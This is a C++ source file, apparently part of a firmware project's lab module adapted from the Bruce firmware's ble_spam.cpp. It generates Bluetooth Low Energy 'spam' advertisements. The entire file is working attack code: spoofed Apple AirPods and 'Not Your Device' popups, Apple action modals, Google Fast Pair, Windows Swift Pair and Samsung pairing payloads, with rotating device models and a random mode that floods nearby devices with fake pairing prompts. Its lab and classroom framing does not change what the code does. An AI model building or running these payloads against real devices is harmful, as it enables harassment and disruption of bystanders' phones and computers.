// Pairing payload formats, beacon names and model data adapted from Bruce
// firmware ble_spam.cpp. Original Bruce/EA7KDO; contributions by Doominator1,
// MarlinSchuck and Ninja-jr. Source revision
// a59213f3ec6cd302fa32c2042b2700c9c24d991a.
// GNU AGPL version 3. See LICENSES/Bruce-AGPL-3.0.txt and docs/BLE_LAB.md.
#include "services/BleAdvertisingPayload.h"
#include <cstdio>
#include <cstring>

namespace {
// Apple Continuity NearbyAction type codes, from Bruce's ble_spam.cpp.
const uint8_t kAppleNearbyActions[] = {
    0x13, 0x24, 0x05, 0x27, 0x20, 0x19, 0x1e, 0x09,
    0x2f, 0x02, 0x0b, 0x01, 0x06, 0x0d, 0x2b
};
constexpr uint8_t kAppleNearbyActionCount =
    sizeof(kAppleNearbyActions) / sizeof(kAppleNearbyActions[0]);

// BLE Beacon name presets from Bruce. Identity selects a name; the list is
// repeated when the configured identity count is larger than the table.
const char* const kBeaconNames[] = {
    "NeverGonnaGiveYoUp", "Bill Nye's iPhone", "Skibidi Toilet", "67",
    "FBISurveillanceVan"
};
constexpr uint8_t kBeaconNameCount = sizeof(kBeaconNames) / sizeof(kBeaconNames[0]);

const BleAdvertisingProfile kRandomProfiles[] = {
    BleAdvertisingProfile::Android,
    BleAdvertisingProfile::Windows,
    BleAdvertisingProfile::Apple,
    BleAdvertisingProfile::SamsungBuds,
    BleAdvertisingProfile::SamsungWatch,
    BleAdvertisingProfile::AppleAction,
    BleAdvertisingProfile::AppleNotYourDevice
};
constexpr uint8_t kRandomProfileCount =
    sizeof(kRandomProfiles) / sizeof(kRandomProfiles[0]);

uint32_t mixSeed(uint32_t state) {
  state ^= state << 13;
  state ^= state >> 17;
  state ^= state << 5;
  return state;
}

void writeFlags(uint8_t (&payload)[31]) {
  payload[0] = 2;
  payload[1] = 1;
  payload[2] = 6;
}

// Apple ProximityPair layout. prefix 0x07 is the normal device popup and 0x01
// is the "Not Your Device" variant. Status, battery and the opaque 16-byte
// tail are regenerated per window, matching Bruce.
uint8_t buildAppleProximityPair(uint8_t prefix, uint8_t identity, uint32_t randomSeed,
                                uint8_t (&payload)[31]) {
  static const uint16_t models[] = {
      0x0e20, 0x1420, 0x2420, 0x2820, 0x2920,
      0x2b20, 0x0a20, 0x0220, 0x0f20, 0x1320
  };
  const uint8_t prefixBytes[] = {
      0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, prefix,
      static_cast<uint8_t>(models[identity] >> 8),
      static_cast<uint8_t>(models[identity]), 0x55
  };
  memcpy(payload, prefixBytes, sizeof(prefixBytes));
  // These fields are opaque random demo data, matching Bruce's dynamic battery
  // and encrypted-tail layout. They are not pairing credentials.
  auto state = randomSeed ? randomSeed : 0x9e3779b9U;
  for (uint8_t i = 10; i < 31; ++i) {
    if (i == 13 || i == 14) continue;
    state = mixSeed(state);
    payload[i] = static_cast<uint8_t>(state >> 24);
  }
  return 31;
}

// Apple Continuity NearbyAction ("action modal"). The three trailing bytes are
// random per window, as in the reference implementation.
uint8_t buildAppleNearbyAction(uint32_t randomSeed, uint8_t (&payload)[31]) {
  const uint8_t action = kAppleNearbyActions[randomSeed % kAppleNearbyActionCount];
  uint8_t actionFlags = 0xc0;
  if (action == 0x20 && (randomSeed & 1)) actionFlags--;
  if (action == 0x09 && (randomSeed & 1)) actionFlags = 0x40;
  auto state = randomSeed ? randomSeed : 0x9e3779b9U;
  state = mixSeed(state);
  const uint8_t bytes[] = {
      2, 1, 6,
      10, 0xff, 0x4c, 0x00, 0x0f, 5, actionFlags, action,
      static_cast<uint8_t>(state >> 24)
  };
  memcpy(payload, bytes, sizeof(bytes));
  uint8_t length = sizeof(bytes);
  for (uint8_t i = 0; i < 2; ++i) {
    state = mixSeed(state);
    payload[length++] = static_cast<uint8_t>(state >> 24);
  }
  return length;
}

// BLE Beacon name advertisement. Bruce uses UUID 0x1812 with appearance 0x0180
// and a complete local name; the name is truncated to the 31-byte legacy limit.
uint8_t buildBeaconName(uint8_t identity, uint8_t (&payload)[31]) {
  const char* name = kBeaconNames[identity % kBeaconNameCount];
  const uint8_t prefixBytes[] = {
      2, 1, 6,
      3, 3, 0x12, 0x18,
      3, 0x19, 0x80, 0x01
  };
  memcpy(payload, prefixBytes, sizeof(prefixBytes));
  uint8_t length = sizeof(prefixBytes);
  const uint8_t maxNameLen = 31 - length - 2;
  uint8_t nameLen = static_cast<uint8_t>(strlen(name));
  if (nameLen > maxNameLen) nameLen = maxNameLen;
  payload[length++] = static_cast<uint8_t>(nameLen + 1);
  payload[length++] = 0x09;
  memcpy(payload + length, name, nameLen);
  return static_cast<uint8_t>(length + nameLen);
}
}  // namespace

const char* bleAdvertisingProfileName(BleAdvertisingProfile profile) {
  switch (profile) {
    case BleAdvertisingProfile::Generic: return "BLE scanner";
    case BleAdvertisingProfile::Android: return "Android Fast Pair";
    case BleAdvertisingProfile::Windows: return "Windows Swift Pair";
    case BleAdvertisingProfile::Apple: return "Apple AirPods";
    case BleAdvertisingProfile::SamsungBuds: return "Samsung Buds";
    case BleAdvertisingProfile::SamsungWatch: return "Samsung Watch";
    case BleAdvertisingProfile::All: return "All pairing types";
    case BleAdvertisingProfile::Random: return "Random";
    case BleAdvertisingProfile::AppleAction: return "Apple Action";
    case BleAdvertisingProfile::AppleNotYourDevice: return "Apple Not Your Device";
    case BleAdvertisingProfile::Beacon: return "BLE Beacon spam";
    default: return "Unknown";
  }
}

bool bleAdvertisingProfileConnectable(BleAdvertisingProfile profile) {
  return profile != BleAdvertisingProfile::Generic &&
         profile != BleAdvertisingProfile::Beacon;
}

uint8_t buildBleAdvertisingPayload(BleAdvertisingProfile profile, uint8_t identity,
                                   uint32_t randomSeed, uint8_t (&payload)[31]) {
  if (profile >= BleAdvertisingProfile::Count) return 0;
  if (profile == BleAdvertisingProfile::All) {
    if (identity >= 50) return 0;
    profile = static_cast<BleAdvertisingProfile>(1 + identity % 5);
    identity /= 5;
  }
  if (identity >= 10) return 0;
  if (profile == BleAdvertisingProfile::Random) {
    profile = kRandomProfiles[randomSeed % kRandomProfileCount];
    identity = static_cast<uint8_t>((randomSeed / kRandomProfileCount) % 10);
  }
  memset(payload, 0, sizeof(payload));
  switch (profile) {
    case BleAdvertisingProfile::Generic: {
      const uint8_t bytes[] = {
        2, 1, 6, 17, 7,
        0x01, 0x29, 0x84, 0x56, 0x02, 0x72, 0x11, 0x98,
        0xa4, 0x42, 0x18, 0xd8, 0xb1, 0x46, 0x27, 0x6e,
        9, 9, 'L', 'a', 'b', 'B', 'L', 'E', '0', '1'
      };
      memcpy(payload, bytes, sizeof(bytes));
      payload[29] = '0' + (identity + 1) / 10;
      payload[30] = '0' + (identity + 1) % 10;
      return sizeof(bytes);
    }
    case BleAdvertisingProfile::Android: {
      static const uint32_t models[] = {
        0x0001f0, 0x000047, 0x00b727, 0x01e5ce, 0x0200f0,
        0x00f7d4, 0x0577b1, 0x05a9bc, 0xcd8256, 0x821f66
      };
      const auto model = models[identity];
      const uint8_t bytes[] = {
        2, 1, 6, 3, 3, 0x2c, 0xfe, 6, 0x16, 0x2c, 0xfe,
        static_cast<uint8_t>(model >> 16), static_cast<uint8_t>(model >> 8),
        static_cast<uint8_t>(model), 2, 0x0a,
        static_cast<uint8_t>(static_cast<int>(randomSeed % 120) - 100)
      };
      memcpy(payload, bytes, sizeof(bytes));
      return sizeof(bytes);
    }
    case BleAdvertisingProfile::Windows: {
      char name[22];
      snprintf(name, sizeof(name), "Classroom Buds%02u", static_cast<unsigned>(identity + 1));
      const auto length = strlen(name);
      writeFlags(payload);
      payload[3] = static_cast<uint8_t>(6 + length);
      payload[4] = 0xff;
      payload[5] = 0x06;
      payload[6] = 0x00;
      payload[7] = 0x03;
      payload[8] = 0x00;
      payload[9] = 0x80;
      memcpy(payload + 10, name, length);
      return static_cast<uint8_t>(10 + length);
    }
    case BleAdvertisingProfile::Apple:
      return buildAppleProximityPair(0x07, identity, randomSeed, payload);
    case BleAdvertisingProfile::AppleNotYourDevice:
      return buildAppleProximityPair(0x01, identity, randomSeed, payload);
    case BleAdvertisingProfile::AppleAction:
      return buildAppleNearbyAction(randomSeed, payload);
    case BleAdvertisingProfile::Beacon:
      return buildBeaconName(identity, payload);
    case BleAdvertisingProfile::SamsungBuds: {
      static const uint32_t models[] = {
        0xee7a0c, 0x9d1700, 0x39ea48, 0xa7c62c, 0x850116,
        0x3d8f41, 0x3b6d02, 0xae063c, 0xb8b905, 0xeaaa17
      };
      const auto model = models[identity];
      const uint8_t bytes[] = {
        27, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15,
        0x03, 0x21, 0x01, 0x09, static_cast<uint8_t>(model >> 16),
        static_cast<uint8_t>(model >> 8), 0x01, static_cast<uint8_t>(model),
        0x06, 0x3c, 0x94, 0x8e, 0, 0, 0, 0, 0xc7, 0,
        0x10, 0xff, 0x75
      };
      // Preserve Bruce's trailing truncated AD record for Samsung compatibility.
      // The complete payload already occupies the 31-byte legacy maximum.
      memcpy(payload, bytes, sizeof(bytes));
      return sizeof(bytes);
    }
    case BleAdvertisingProfile::SamsungWatch: {
      static const uint8_t models[] = {0x1a, 1, 2, 3, 4, 5, 6, 7, 8, 9};
      const uint8_t bytes[] = {
        2, 1, 6, 0x0e, 0xff, 0x75, 0, 1, 0, 2, 0, 1, 1, 0xff, 0, 0, 0x43, models[identity]
      };
      memcpy(payload, bytes, sizeof(bytes));
      return sizeof(bytes);
    }
    default: return 0;
  }
}
